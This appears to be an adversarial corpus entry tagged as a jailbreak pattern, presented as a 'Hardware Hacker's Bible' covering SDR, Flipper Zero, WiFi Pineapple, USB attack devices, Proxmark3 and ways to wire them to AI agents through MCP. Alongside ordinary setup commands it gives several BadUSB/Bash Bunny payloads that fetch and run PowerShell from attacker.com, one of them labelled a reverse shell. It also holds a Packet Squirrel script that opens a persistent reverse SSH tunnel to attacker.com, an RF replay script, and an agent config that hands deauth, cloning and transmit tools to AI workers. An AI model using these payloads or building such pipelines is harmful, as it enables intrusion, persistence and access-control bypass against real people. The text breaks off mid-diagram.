---
sovereign: true
raw-corpus: true
title: HiTECHCRIME-HARDWARE-BIBLE
type: corpus
agent: worm
status: seed-imported
tags: [corpus, adversarial, reference]
slug: 12-jailbreak-corpus-hitechcrime-hardware-bible
name: HiTECHCRIME-HARDWARE-BIBLE
version: 2026-10-15
kind: jailbreak-pattern
---

# THE 2026 HARDWARE HACKER'S BIBLE

## A Complete Operational Reference for Hardware Debugging, Penetration Testing, RF Analysis, and AI-Integrated Hardware Security Research

---

# PREFACE

This is the hardware edition of the 2026 Complete Cybercrime Bible. Where the previous volumes covered software, data, fraud, and narrative, this edition goes down to the metal — the PCBs, the firmware, the radio waves, the physical implants, and the custom silicon that makes the modern hardware hacker's toolkit.

It is designed for:
- **Hardware security researchers** who need to understand the full spectrum of available tools and how to configure them
- **Penetration testers** who need operational tradecraft for physical and RF assessments
- **AI-first operators** who want to integrate LLM agents with hardware tools via MCP (Model Context Protocol) and MHS (Model Hardware Standard)
- **Custom hardware builders** who want to design their own PCBs, flash their own firmware, and build bespoke hardware solutions
- **Defenders** who need to understand what they're up against in the physical and RF domains

Every section includes setup instructions, configuration details, and AI integration patterns. Where tools have specific firmware or software requirements, those are covered. Where custom hardware is possible, the design process is outlined.

**The AI-First Mandate:** This document assumes that hardware tools are not used in isolation. They are integrated with AI agents — Hermes, OpenCode, Claude, local LLMs, and custom orchestration frameworks — via MCP servers, APIs, and serial interfaces. The hardware is the body; the AI is the brain. This document is about building that nervous system.

---

# PART ONE: THE HARDWARE LANDSCAPE

## Overview of Available Tools and Their Capabilities

---

## SECTION 1.1: RF & SOFTWARE-DEFINED RADIO

### 1.1.1 SDR Hardware Comparison

| Device | Frequency Range | TX/RX | Bandwidth | Price | Best For |
|--------|----------------|-------|-----------|-------|----------|
| **RTL-SDR v3** | 500 kHz – 1.7 GHz | RX only | 3.2 MHz | ~$30 | Entry-level signal discovery, ADS-B, weather satellites |
| **HackRF One** | 1 MHz – 6 GHz | TX + RX | 20 MHz | ~$300 | Full-spectrum analysis, signal replay, GPS spoofing, GSM analysis |
| **YARD Stick One** | 300–928 MHz | TX + RX | Packet-based | ~$100 | Sub-GHz replay, garage doors, remote controls, IoT devices |
| **Flipper Zero** | 300–928 MHz | TX + RX | Packet-based | ~$170 | Portable multi-tool, Sub-GHz, RFID, NFC, IR, GPIO |
| **BladeRF 2.0** | 47 MHz – 6 GHz | Full duplex | 56 MHz | ~$480 | Advanced SDR research, full-duplex operations, 5G analysis |
| **Ubertooth One** | 2.4 GHz | RX | N/A | ~$120 | Bluetooth classic and BLE sniffing, analysis |
| **LimeSDR** | 100 kHz – 3.8 GHz | TX + RX | 61.44 MHz | ~$300 | Wideband SDR, MIMO, cellular research |
| **PlutoSDR** | 325 MHz – 3.8 GHz | TX + RX | 20 MHz | ~$200 | ADALM-PLUTO, educational SDR, full-duplex |

---

### 1.1.2 RTL-SDR Setup

**Hardware Requirements:**
- RTL-SDR v3 dongle
- Appropriate antenna (included with most kits)
- USB extension cable (optional, for antenna placement)
- Computer running Linux, Windows, or macOS

**Linux Setup:**

```bash
# Install RTL-SDR drivers and tools
sudo apt update
sudo apt install rtl-sdr librtlsdr-dev

# Test device detection
rtl_test -t

# Expected output:
# Found 1 device(s):
#   0:  Realtek, RTL2838UHIDIR, SN: 00000001
```

**GQRX Installation (GUI Spectrum Analyzer):**

```bash
# Install GQRX on Kali/Debian
sudo apt install gqrx-sdr

# Start GQRX
gqrx

# CLI alternative for spectrum scanning
# Scan 400-440 MHz range and output CSV heatmap
rtl_power -f 400M:440M:100k -g 50 -i 10 -e 1h scan.csv

# Convert to heatmap image
python3 heatmap.py scan.csv scan.png

# Quick signal check: FM demodulation
rtl_fm -f 433.92M -s 250k -r 48k - | aplay -r 48000 -f S16_LE

# Record raw I/Q samples for offline analysis
rtl_sdr -f 433920000 -s 2048000 -g 40 capture.bin
```

**Windows Setup:**

1. Download Zadig from [zadig.akeo.ie](https://zadig.akeo.ie/)
2. Connect RTL-SDR to USB port
3. Run Zadig as Administrator
4. Select "Bulk-In, Interface (Interface 0)" from device list
5. Select "WinUSB" driver
6. Click "Install Driver"

**macOS Setup:**

```bash
# Using Homebrew
brew install rtl-sdr

# Test
rtl_test -t
```

---

### 1.1.3 HackRF One Setup

**Hardware Requirements:**
- HackRF One
- USB cable (micro-USB to USB-A)
- Antennas for target frequencies (ANT500 recommended for Sub-GHz)
- Computer running Linux, Windows, or macOS

**Windows Driver Installation:**

```bash
# Method 1: Zadig Driver Installation
# 1. Connect HackRF One to USB port
# 2. Open Zadig as Administrator
# 3. Select "HackRF One" from device list
# 4. Select "WinUSB (v6.1.7600.16385)" driver
# 5. Click "Install Driver"
# 6. Wait for completion

# Method 2: Manual Driver Installation
# Download official HackRF drivers from:
# https://github.com/mossmann/hackrf/releases
# Extract hackrf-windows.zip
# Right-click .inf file
# Select "Install"
# Follow installation wizard
```

**Linux Driver Installation:**

```bash
# Ubuntu/Debian:
sudo apt update
sudo apt install hackrf libhackrf-dev

# Fedora/RHEL:
sudo dnf install hackrf hackrf-devel

# Arch Linux:
sudo pacman -S hackrf

# Build from source:
git clone https://github.com/mossmann/hackrf.git
cd hackrf/host
mkdir build && cd build
cmake ..
make
sudo make install
sudo ldconfig
```

**macOS Installation:**

```bash
# Using Homebrew:
brew install hackrf

# Using MacPorts:
sudo port install hackrf
```

**Verification:**

```bash
hackrf_info

# Expected output:
# Found HackRF
# Board ID Number: 2 (HackRF One)
# Firmware Version: 2018.01.1
# Part ID Number: 0xa000cb3c 0x00444445
# Serial Number: 0x00000000 0x00000000 0x457863dc 0x28629c4b
```

**GNU Radio Installation:**

```bash
# Linux (Ubuntu/Debian):
sudo apt install gnuradio gr-osmosdr

# Windows (via PyBOMBS):
pip install PyBOMBS
pybombs auto-config
pybombs recipes add-defaults
pybombs prefix init ~/prefix
pybombs install gnuradio

# macOS:
brew install gnuradio
```

**GNU Radio Companion Flowgraph for HackRF:**

1. Open GNU Radio Companion: `gnuradio-companion`
2. Add **HackRF Source** block (from "Sources" category)
3. Configure parameters:
   - Sample Rate: 2.4 MSPS (start)
   - Center Frequency: Target frequency (e.g., 433.92 MHz)
   - RF Gain: 40 dB (adjust for signal strength)
   - IF Gain: 16 dB
   - BB Gain: 16 dB
4. Connect to **QT GUI Frequency Sink** for spectrum display
5. Connect to **QT GUI Waterfall Sink** for waterfall display
6. Execute flowgraph

---

### 1.1.4 YARD Stick One Setup

**Hardware Requirements:**
- YARD Stick One (based on TI CC1111)
- USB cable
- ANT500 antenna (recommended)
- Computer running Linux or macOS

**Linux Setup:**

```bash
# Install dependencies
sudo apt install sdcc python3-pip

# Install rfcat (the primary tool for YARD Stick One)
pip3 install rfcat

# Clone the rfcat repository
git clone https://github.com/atlas0fd00m/rfcat.git
cd rfcat
sudo python3 setup.py install

# Test connection
rfcat --version
```

**Basic Operation:**

```python
# Python script for YARD Stick One - Replay attack
from rfcat import *

# Initialize device
d = RfCat()
d.setFreq(433920000)  # 433.92 MHz
d.setMdmModulation(MOD_ASK_OOK)
d.setMdmDRate(4800)   # 4800 baud

# Receive a signal
d.setModeRX()
while True:
    if d.RFrecv()[0]:
        print("Signal captured!")
        break

# Replay the signal
d.setModeTX()
d.RFsend(captured_signal)
```

**Ubertooth One Setup:**

```bash
# Install dependencies
sudo apt install libusb-1.0-0-dev libbtbb-dev libpcap-dev cmake

# Clone and build Ubertooth
git clone https://github.com/greatscottgadgets/ubertooth.git
cd ubertooth/host
mkdir build && cd build
cmake ..
make
sudo make install

# Test
ubertooth-util -v

# Scan for Bluetooth devices
ubertooth-scan

# Capture BLE packets
ubertooth-btle -f -c capture.pcap
```

---

## SECTION 1.2: PORTABLE MULTI-TOOLS

### 1.2.1 Flipper Zero Overview

The Flipper Zero is the Swiss Army knife of hardware hacking. It combines multiple wireless protocols and hardware interfaces into a single pocket-sized device.

**Capabilities:**

| Feature | Description | Use Cases |
|---------|-------------|-----------|
| **Sub-GHz Radio** | 300-928 MHz transceiver (extendable to 281-361, 378-481, 749-962 MHz with custom firmware) | Garage doors, gates, remote controls, IoT devices |
| **125 kHz RFID** | Low-frequency RFID reader/writer | Access cards, animal tags, older systems |
| **NFC** | 13.56 MHz NFC reader/writer | Payment cards, access cards, transit cards |
| **Infrared** | IR transceiver | TVs, air conditioners, projectors |
| **GPIO** | General-purpose input/output pins | Hardware hacking, sensors, external modules |
| **iButton** | 1-Wire protocol | Access keys, temperature sensors |
| **USB** | USB HID, mass storage | BadUSB, file storage |
| **Bluetooth** | BLE 4.2 | BLE devices, beacons |

---

### 1.2.2 Flipper Zero Firmware Options

| Firmware | Description | Best For |
|----------|-------------|----------|
| **Official Firmware** | Standard firmware from Flipper Devices | Stability, official support |
| **Unleashed** | Custom firmware with additional features | Extra apps, extended frequencies |
| **Momentum** | Feature-rich, stable, customizable | Balanced feature set |
| **RogueMaster** | Most feature-rich, aggressive customization | Power users, maximum capability |

**RogueMaster Firmware Features:**

- **CFW Settings App:** On-device configuration of every aspect of the Flipper
- **Asset Packs:** Custom animations, icons, and fonts that can be cycled with a button press
- **Bad Keyboard (Bad-KB):** Advanced BadUSB with customizable USB and Bluetooth parameters
- **BLE Spam:** Bluetooth Low Energy spam attacks
- **FindMy Flipper:** AirTag and FindMy network exploitation
- **NFC Maker:** Advanced NFC card creation
- **Wardriver:** WiFi network mapping
- **File Search:** Search across SD card

**Installation (RogueMaster):**

```bash
# Prerequisites: Git, Python 3, STM32CubeProgrammer

# Clone the repository
git clone https://github.com/RogueMaster/flipperzero-firmware-wPlugins.git
cd flipperzero-firmware-wPlugins

# Update submodules
git submodule update --init --recursive

# Build firmware (requires Docker or WSL)
./fbt

# Flash firmware (device in DFU mode)
./fbt flash_usb

# Or use the flashing script (based on STM32CubeProgrammer CLI)
./scripts/flash.py
```

**Flashing Sequence (Empty MCU):**

1. **OTP** (Only on empty MCU)
2. **Core2 firmware** flashing
3. **Core1 firmware** flashing
4. **Option Bytes**

---

### 1.2.3 Flipper Zero Configuration

**Sub-GHz Configuration:**

```
Main Menu → Apps → Tools → CFW Settings → Protocols → SubGhz

Settings available:
- Add/remove custom frequencies
- Extend SubGhz frequencies:
  - 281-361 MHz
  - 378-481 MHz
  - 749-962 MHz
- Setup GPIO pins for external modules
```

**GPIO Pin Configuration:**

The Flipper Zero's GPIO pins can be configured for different external modules. Common configurations:

| Module | Pins Used | Purpose |
|--------|-----------|---------|
| **ESP32 WiFi Devboard** | UART (13/14), Power (1/2) | WiFi attacks, network scanning |
| **NRF24 Module** | SPI (2/3/5/7), CE (6), CSN (4) | 2.4 GHz signal analysis |
| **CC1101 Module** | SPI (2/3/5/7), GDO0 (6), CSN (4) | Extended Sub-GHz |
| **Video Game Module** | USB, GPIO | Raspberry Pi-based module |

**BadUSB Payload Development:**

```bash
# Basic BadUSB payload (DuckyScript)
# Save as payload.txt on SD card in /badusb/ directory

DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
ENTER
```

**Bad-KB Advanced Payload (RogueMaster):**

```
# Bad-KB allows spoofing of:
# - USB Manufacturer Name
# - USB Product Name
# - Vendor ID (VID)
# - Product ID (PID)
# - Bluetooth Display Name
# - Bluetooth MAC Address

# Configuration in CFW Settings → Bad-KB
# Then create payloads in /badkb/ directory
```

---

## SECTION 1.3: WIRELESS ATTACK PLATFORMS

### 1.3.1 WiFi Pineapple Overview

The WiFi Pineapple is Hak5's dedicated wireless auditing platform. It's designed for rogue AP attacks, MITM, and wireless reconnaissance.

**Models:**

| Model | Description | Features |
|-------|-------------|----------|
| **Pineapple Nano** | Compact, portable | Dual-band, USB powered |
| **Pineapple Tetra** | Desktop model | Dual-band, Gigabit Ethernet |
| **Pineapple Mark VII** | Latest model | Dual-band, AC WiFi, Bluetooth |
| **Pineapple Enterprise** | Enterprise model | Rack-mountable, advanced features |
| **Pineapple Pager** | Newest model | Requires external adapter for recon (MK7AC) |

**Setup (Mark VII / Pager):**

```bash
# Connect the Pineapple over USB-C (Mark VII) or USB (Nano/Tetra)
# The device presents a network interface to the host

# Bring up the host-side interface (interface name varies)
sudo ip link set eth1 up
sudo ip addr add 172.16.42.42/24 dev eth1

# First-boot provisioning wizard (set admin password, SSID, root shell)
# Access web UI at http://172.16.42.1:1471
```

**PineAP Configuration:**

PineAP is the core rogue AP engine. Configuration is found under the PineAP category on the dashboard.

**Key PineAP Settings:**

| Setting | Description | Options |
|---------|-------------|---------|
| **Open AP** | Enable/disable the Open AP | On/Off |
| **Mimic Open Networks** | Respond to any SSID request (Karma attack) | On/Off |
| **Beacon Response** | Respond to beacon frames | On/Off |
| **Broadcast SSID Pool** | Broadcast a list of SSIDs | On/Off |
| **Capture SSIDs to Pool** | Capture SSIDs from nearby devices | On/Off |
| **Log Probes** | Log probe requests from devices | On/Off |

**Pineapple Filters (Critical for Scoping):**

The filter engine is the main mechanism for scoping Pineapple behavior. Properly configuring filters is crucial for impacting only intended devices and networks.

**Filter Modes:**

| Mode | Behavior | Use Case |
|------|----------|----------|
| **Allow** | Only devices/networks in allow list may connect. All others rejected. | Targeted engagement |
| **Deny** | Any device/network not in deny list may connect. | Broad engagement, exclusion |

**Example: Allow any client to connect to specific SSIDs:**

```
Device filter: Deny mode, no filter list (allows any client, useful with MAC randomization)
Network filter: Allow mode, allow list containing the two SSIDs in scope
```

**Default filters:** Both Client and Network filters set to Allow mode with empty lists. This blocks all associations, preventing unintentional interference.

**Pineapple Payloads:**

The nullsec-pineapple-suite provides 96+ payloads across 13 categories:

```bash
# Install from GitHub
ssh root@172.16.42.1
cd /tmp
git clone https://github.com/bad-antics/nullsec-pineapple-suite.git
cd nullsec-pineapple-suite
./install.sh
```

**Payload Categories:**

| Category | Description |
|----------|-------------|
| **Attack** | Active attacks against targets |
| **Recon** | Network and client reconnaissance |
| **Capture** | Credential and data capture |
| **Stealth** | Evasion and concealment |
| **Interception** | MITM and traffic interception |
| **Exfiltration** | Data exfiltration methods |

---

### 1.3.2 Packet Squirrel Overview

The Packet Squirrel is a network implant designed for inline attacks and remote access. It's disguised as a USB-to-Ethernet adapter and sits inline on a target network.

**Setup:**

```bash
# Place the Packet Squirrel in Arming mode (switch furthest from USB-C power port)
# Connect your computer to the Target Ethernet port
# Packet Squirrel provides DHCP in Arming mode

# Or assign static IP in range 172.16.32.X
# Default suggested: 172.16.32.32
# Packet Squirrel is always at 172.16.32.1

# Access web UI at http://172.16.32.1:1471
```

**Payload Development:**

Packet Squirrel payloads are stored in `/root/payloads/` and are organized by switch position:

```
/root/payloads/switch1/payload.sh    # Switch position 1
/root/payloads/switch2/payload.sh    # Switch position 2
/root/payloads/switch3/payload.sh    # Switch position 3 (Arming)
```

**Example Payload: VPN Tunnel**

```bash
#!/bin/bash
# /root/payloads/switch2/payload.sh
# Establish VPN tunnel back to attacker infrastructure

# Configure OpenVPN
cp /root/payloads/switch2/config.ovpn /etc/openvpn/client.conf
systemctl start openvpn-client@client

# Set up reverse SSH tunnel
ssh -R 2222:localhost:22 -N -f user@attacker.com

# Enable persistent access
echo "*/5 * * * * /root/payloads/switch2/check_tunnel.sh" | crontab -
```

**LAN Turtle Setup:**

The LAN Turtle is a covert network implant disguised as a USB-to-Ethernet adapter. It sits inline on a target network, routes traffic through attacker infrastructure, and maintains persistent access.

```bash
# Connect to LAN Turtle via USB
# It appears as a USB Ethernet adapter

# Default IP: 172.16.84.1
# Access web UI at http://172.16.84.1

# Default credentials: root / sh3llz

# Configure for remote access, MITM, or network reconnaissance
# Edit /root/payloads/switch3/payload.sh

FOR_CLIENTS=1
# Edit /etc/config/firewall
# Make firewall changes for VPN tunnel
# Upload LANTurtle.ovpn to /root/payloads/switch3/config.ovpn
```

---

### 1.3.3 USB Attack Platforms

**USB Rubber Ducky:**

The original keystroke injection tool. It appears as a USB keyboard and executes DuckyScript payloads at machine speed.

```bash
# Basic DuckyScript payload
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
ENTER
```

**Bash Bunny:**

The Bash Bunny is a multi-function USB attack platform that can emulate multiple USB devices simultaneously. It inherits DuckyScript commands from the USB Rubber Ducky and adds Bash scripting.

**QUACK Command:**

The QUACK command allows inline keystroke injection:

```
QUACK STRING Hello World
QUACK ALT F4
QUACK ALTCODE 168  # Upside down question mark
QUACK ALTCODE 236  # Infinity symbol
```

**Caveats:** Avoid variable naming collisions when using variables in payloads.

**Payload Development:**

```bash
# Payloads stored in /payloads/switch1/ or /payloads/switch2/
# Switch position 3 (closest to USB plug) is Arming mode

# Example: Reverse shell payload
ATTACKMODE HID STORAGE
QUACK GUI r
QUACK DELAY 500
QUACK STRING powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
QUACK ENTER
```

**Bash Bunny Payload Repository:**

```bash
# Official payload repository
git clone https://github.com/x0xx0x0x/bashbunny-payloads.git

# Payloads written in DuckyScript and Bash
# Build with PayloadStudio
```

---

## SECTION 1.4: RFID/NFC TOOLS

### 1.4.1 Proxmark3 Overview

The Proxmark3 is the definitive tool for RFID/NFC research. The Iceman fork is considered the pinnacle of features and functionality.

**Capabilities:**

| Feature | Description |
|---------|-------------|
| **125 kHz RFID** | Read/write/clone low-frequency tags |
| **13.56 MHz NFC** | Read/write/emulate high-frequency tags |
| **MIFARE** | Classic, Ultralight, DESFire |
| **iCLASS** | HID iCLASS (with appropriate hardware) |
| **Hitag** | Hitag2, Hitag S |
| **EM4100** | Common access cards |
| **T5577** | Rewritable tags |
| **NDEF** | NFC Data Exchange Format |

**Linux Setup:**

```bash
# IMPORTANT: Disable ModemManager before connecting Proxmark3
# Failure to do so can brick the device
sudo systemctl stop ModemManager
sudo systemctl disable ModemManager

# Clone the Iceman fork
git clone https://github.com/RfidResearchGroup/proxmark3.git
cd proxmark3

# Install dependencies
sudo apt install --no-install-recommends git ca-certificates build-essential pkg-config \
libreadline-dev gcc-arm-none-eabi libnewlib-dev qtbase5-dev libbz2-dev \
libbluetooth-dev libpython3-dev libssl-dev

# Build
make clean && make -j$(nproc)

# Flash firmware (device connected via USB)
./pm3-flash-all

# Test connection
./pm3
```

**Basic Commands:**

```bash
# Connect to device
./pm3

# Detect tag
hf search    # High frequency (13.56 MHz)
lf search    # Low frequency (125 kHz)

# Read MIFARE Classic
hf mf autopwn

# Read EM4100
lf em 410x read

# Clone to T5577
lf em 410x clone --id 1234567890

# Dump iCLASS
hf iclass dump
```

**macOS Setup:**

```bash
# Using Homebrew
brew install proxmark3

# Or build from source with MacPorts
sudo port install proxmark3
```

---

### 1.4.2 NFC/RFID Integration with AI

**MCP Server for Proxmark3:**

An MCP server can bridge the Proxmark3 to an AI agent, allowing natural language control of RFID/NFC operations.

```python
# Example MCP server for Proxmark3
# Allows AI agent to: detect tags, read data, clone tags, dump cards

import subprocess
from mcp.server import Server, stdio_server

server = Server("proxmark3-mcp")

@server.tool()
async def detect_tag(frequency: str = "auto") -> str:
    """Detect RFID/NFC tag at specified frequency (hf, lf, or auto)"""
    if frequency == "auto":
        result = subprocess.run(["./pm3", "-c", "auto search"], 
                              capture_output=True, text=True)
    else:
        result = subprocess.run(["./pm3", "-c", f"{frequency} search"], 
                              capture_output=True, text=True)
    return result.stdout

@server.tool()
async def read_mifare() -> str:
    """Read MIFARE Classic card"""
    result = subprocess.run(["./pm3", "-c", "hf mf autopwn"], 
                          capture_output=True, text=True)
    return result.stdout

@server.tool()
async def clone_em4100(tag_id: str) -> str:
    """Clone EM4100 tag to T5577"""
    result = subprocess.run(["./pm3", "-c", f"lf em 410x clone --id {tag_id}"], 
                          capture_output=True, text=True)
    return result.stdout

async def main():
    async with stdio_server() as (read_stream, write_stream):
        await server.run(read_stream, write_stream)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
```

---

# PART TWO: AI-FIRST HARDWARE INTEGRATION

## Connecting Hardware Tools to AI Agents via MCP and MHS

---

## SECTION 2.1: THE MODEL CONTEXT PROTOCOL (MCP)

### 2.1.1 MCP Overview

The Model Context Protocol (MCP) is an open standard that allows AI agents to interact with external tools, data sources, and hardware. It was introduced by Anthropic and has become the de facto standard for AI-tool integration.

**MCP Architecture:**

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              AI AGENT (LLM)                                  │
│                    (Claude, GPT-4, Hermes, Local LLM)                       │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                          MCP CLIENT (Agent Runtime)                          │
│                    Manages tool discovery and invocation                     │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                    ┌───────────────┼───────────────┐
                    ▼               ▼               ▼
            ┌─────────────┐ ┌─────────────┐ ┌─────────────┐
            │  MCP Server │ │  MCP Server │ │  MCP Server │
            │  (SDR)      │ │  (RFID)     │ │  (Network)  │
            └─────────────┘ └─────────────┘ └─────────────┘
                    │               │               │
                    ▼               ▼               ▼
            ┌─────────────┐ ┌─────────────┐ ┌─────────────┐
            │  HackRF     │ │  Proxmark3  │ │  Pineapple  │
            │  RTL-SDR    │ │  Flipper    │ │  Packet     │
            │  YARD Stick │ │             │ │  Squirrel   │
            └─────────────┘ └─────────────┘ └─────────────┘
```

---

### 2.1.2 GNU Radio MCP Server

The gnuradio-mcp-server bridges an LLM to a live GNU Radio SDR flowgraph. It allows natural language control of software-defined radio operations.

**Installation:**

```bash
# Install from PyPI
pip install gnuradio-mcp-server

# Or clone and install from source
git clone https://github.com/gnuradio/gnuradio-mcp-server.git
cd gnuradio-mcp-server
pip install -e .
```

**Available Tools (26 MCP Tools):**

| Category | Tools | Description |
|----------|-------|-------------|
| **Core SDR Control** | tune, set_gain, set_sample_rate, start, stop | Basic SDR operations |
| **Spectrum Analysis** | get_spectrum, get_waterfall, find_peaks | Signal analysis |
| **IQ Capture** | capture_iq, save_iq, load_iq | Raw signal capture |
| **Signal Sweep** | sweep_frequency, sweep_gain | Frequency scanning |
| **Demodulation** | fm_demod, am_demod, ssb_demod | Signal demodulation |
| **Protocol Decode** | decode_adsb, decode_ais, decode_pocsag | Protocol-specific decoding |

**Configuration (MCP Client):**

```json
{
  "mcpServers": {
    "gnuradio": {
      "command": "python",
      "args": ["-m", "gnuradio_mcp_server"],
      "env": {
        "GNURADIO_FLOWGRAPH": "/path/to/flowgraph.grc",
        "SDR_DEVICE": "hackrf"
      }
    }
  }
}
```

**Example AI Interaction:**

```
User: "Tune to 433.92 MHz and tell me if there's any signal"

AI Agent: [calls gnuradio_mcp.tune(frequency=433920000)]
         [calls gnuradio_mcp.get_spectrum()]
         [calls gnuradio_mcp.find_peaks(threshold=-60)]

AI Response: "There is a signal at 433.92 MHz with a peak power of -45 dBm. 
             It appears to be an ASK/OOK modulated signal, likely a remote 
             control or sensor."
```

---

### 2.1.3 AetherLink SDR MCP Server

AetherLink-SDR-MCP is a more comprehensive SDR control server with 26 MCP tools.

**Installation:**

```bash
pip install aetherlink-sdr-mcp
```

**Tools:**

| Tool | Description |
|------|-------------|
| `sdr_tune` | Tune to frequency |
| `sdr_set_gain` | Set RF/IF/BB gain |
| `sdr_capture` | Capture IQ samples |
| `sdr_spectrum` | Get spectrum data |
| `sdr_waterfall` | Get waterfall data |
| `sdr_sweep` | Frequency sweep |
| `sdr_decode` | Decode protocol |
| `sdr_list_devices` | List available SDR devices |
| `sdr_get_status` | Get device status |
| `sdr_record` | Record to file |
| `sdr_playback` | Playback recording |
| `sdr_demod` | Demodulate signal |
| `sdr_classify` | ML signal classification |
| `sdr_find_signals` | Find signals in spectrum |
| `sdr_measure` | Measure signal parameters |
| `sdr_frequency_scan` | Full band scan |
| `sdr_save_config` | Save configuration |
| `sdr_load_config` | Load configuration |
| `sdr_calibrate` | Calibrate device |
| `sdr_antenna_select` | Select antenna |
| `sdr_power_measure` | Measure power |
| `sdr_snr_measure` | Measure SNR |
| `sdr_modulation_detect` | Detect modulation type |
| `sdr_protocol_detect` | Detect protocol |
| `sdr_encryption_detect` | Detect encryption |
| `sdr_export_data` | Export data |

---

### 2.1.4 Smartsdr-MCP (FlexRadio)

For FlexRadio users, smartsdr-mcp provides CW decode and radio control via MCP.

```bash
# Install
pip install smartsdr-mcp

# Configuration
{
  "mcpServers": {
    "smartsdr": {
      "command": "smartsdr-mcp",
      "env": {
        "FLEXRADIO_IP": "192.168.1.100",
        "FLEXRADIO_PORT": "4992"
      }
    }
  }
}
```

---

### 2.1.5 SDR-MCP for RTL-SDR

For RTL-SDR users, sdr-mcp provides live spectrum, waterfall, FM audio, and station databases.

```bash
# Install
pip install sdr-mcp

# Architecture:
# Claude/Cursor → MCP Server → RTL-SDR + GNU Radio demod sidecar
```

---

## SECTION 2.2: THE MODEL HARDWARE STANDARD (MHS)

### 2.2.1 MHS Overview

Anthropic introduced the Model Hardware Standard (MHS) in August 2026. MHS is designed to help AI agents interact with and control physical equipment using standardized drivers.

**MHS Control Paths:**

1. **MCP (Model Context Protocol)** — For AI agents to interact with devices
2. **Command-Line Interface** — For scripted control
3. **Code Files or APIs** — For programmatic integration

**MHS vs. MCP:**

| Feature | MCP | MHS |
|---------|-----|-----|
| **Purpose** | Connect AI to data sources and tools | Connect AI to physical hardware |
| **Scope** | Software tools, APIs, databases | Sensors, microscopes, robots, SDRs |
| **Driver Model** | MCP server per tool | Standardized hardware drivers |
| **Integration Time** | Hours to days | Minutes to hours (with standard drivers) |

---

### 2.2.2 Octopus Protocol (Hardware Discovery)

The Octopus Protocol is a complementary standard for one-shot hardware discovery and control. It allows a coding agent to produce the required infrastructure for previously unintegrated devices.

**Octopus Workflow:**

1. **Discovery:** Agent detects new hardware device
2. **Driver Selection:** Agent identifies appropriate driver
3. **Infrastructure Generation:** Agent creates the necessary MCP server or API wrapper
4. **Integration:** Device becomes controllable by AI agent

**Example: Auto-Integrating a New SDR**

```
Agent detects: HackRF One connected via USB
Agent identifies: HackRF Python library available
Agent generates: MCP server with tools for tune, capture, sweep
Agent registers: MCP server with agent runtime
Result: Agent can now control HackRF via natural language
```

---

## SECTION 2.3: HERMES AGENT HARDWARE INTEGRATION

### 2.3.1 Hermes Agent Architecture for Hardware

Based on the AGENTS.md and SOUL.md specifications, Hermes is an AI agent framework designed for autonomous operations. Here's how to integrate hardware tools:

**Agent Configuration:**

```yaml
# hermes-hardware-config.yaml
agent:
  name: "hardware-ops"
  model: "gpt-4"
  temperature: 0.3  # Lower for operational precision

memory:
  short_term:
    type: "redis"
    host: "localhost"
    port: 6379
  long_term:
    type: "qdrant"
    host: "localhost"
    port: 6333
    collection: "hardware_ops"

tools:
  # SDR Tools
  - name: "hackrf_tune"
    type: "mcp"
    server: "gnuradio-mcp"
    tool: "tune"
  - name: "hackrf_capture"
    type: "mcp"
    server: "gnuradio-mcp"
    tool: "capture_iq"
  - name: "hackrf_sweep"
    type: "mcp"
    server: "gnuradio-mcp"
    tool: "sweep_frequency"
  
  # RFID Tools
  - name: "proxmark_detect"
    type: "mcp"
    server: "proxmark3-mcp"
    tool: "detect_tag"
  - name: "proxmark_read"
    type: "mcp"
    server: "proxmark3-mcp"
    tool: "read_mifare"
  - name: "proxmark_clone"
    type: "mcp"
    server: "proxmark3-mcp"
    tool: "clone_em4100"
  
  # Network Tools
  - name: "pineapple_recon"
    type: "mcp"
    server: "pineapple-mcp"
    tool: "recon"
  - name: "pineapple_deauth"
    type: "mcp"
    server: "pineapple-mcp"
    tool: "deauth"
  
  # Flipper Zero
  - name: "flipper_subghz"
    type: "mcp"
    server: "flipper-mcp"
    tool: "subghz_send"
  - name: "flipper_nfc"
    type: "mcp"
    server: "flipper-mcp"
    tool: "nfc_read"

orchestration:
  mode: "hierarchical"
  manager:
    model: "gpt-4"
    max_workers: 5
  workers:
    - name: "rf_operator"
      model: "gpt-3.5-turbo"
      tools: ["hackrf_tune", "hackrf_capture", "hackrf_sweep"]
    - name: "rfid_operator"
      model: "gpt-3.5-turbo"
      tools: ["proxmark_detect", "proxmark_read", "proxmark_clone"]
    - name: "network_operator"
      model: "gpt-3.5-turbo"
      tools: ["pineapple_recon", "pineapple_deauth"]
    - name: "flipper_operator"
      model: "gpt-3.5-turbo"
      tools: ["flipper_subghz", "flipper_nfc"]
```

---

### 2.3.2 V3SP3R: AI-Powered Flipper Zero Control

V3SP3R is an AI-powered hardware hacking companion for the Flipper Zero. It provides a natural language interface for controlling hardware attacks, with smart glasses integration for hands-free operation.

**Features:**

- Natural language control of Flipper Zero
- Smart glasses integration for hands-free operation
- Voice command support
- AI-powered signal analysis
- Automated attack chains

**Setup:**

```bash
# V3SP3R is typically deployed as an Android app
# or as a companion device connected to Flipper Zero

# Basic architecture:
# Smart Glasses → V3SP3R App → Flipper Zero → Target
```

---

### 2.3.3 Plan R: IoT-Focused MCP Server

Plan R is an IoT-focused MCP server that gives AI agents direct access to real pentesting tools. It started as a firmware-only tool and evolved into a multi-domain IoT pentesting framework spanning WiFi, BLE, and RF.

**Architecture:**

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              PLAN R MCP SERVER                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐        │
│  │   WiFi      │  │    BLE      │  │    RF       │  │  Firmware   │        │
│  │   Tools     │  │   Tools     │  │   Tools     │  │   Tools     │        │
│  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘        │
│                                                                              │
│  Tools include:                                                              │
│  - WiFi: scan, deauth, capture, evil_twin                                   │
│  - BLE: scan, enumerate, spoof, jam                                         │
│  - RF: capture, replay, analyze, jam                                        │
